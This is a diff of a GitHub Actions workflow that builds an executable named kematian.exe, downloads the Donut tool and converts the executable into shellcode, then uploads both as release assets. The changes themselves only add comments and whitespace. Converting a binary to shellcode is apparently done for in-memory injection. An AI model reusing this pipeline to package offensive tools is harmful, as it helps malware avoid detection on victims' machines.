@@ -70,17 +70,20 @@ jobs:
         asset_path: kematian-src\kematian.exe
         asset_name: kematian.exe
         asset_content_type: application/zip
-
+       
+    # Download Donut
     - name: Download Donut
       run: Invoke-WebRequest https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -OutFile donut.zip
-
+    
+    # Extract Donut
     - name: Extract donut
       run: Expand-Archive donut.zip
 
+    # Convert Kematian To Shellcode 
     - name: Convert kematian-src to Shellcode 
       run: .\donut\donut.exe -i kematian-src\kematian.exe -x2 -a2 -o kematian.bin -z 4
 
-    # Upload Release Asset
+    # Upload Shellcode Asset
     - name: Upload Release Asset
       id: upload-release-asset-donut
       uses: actions/upload-release-asset@v1
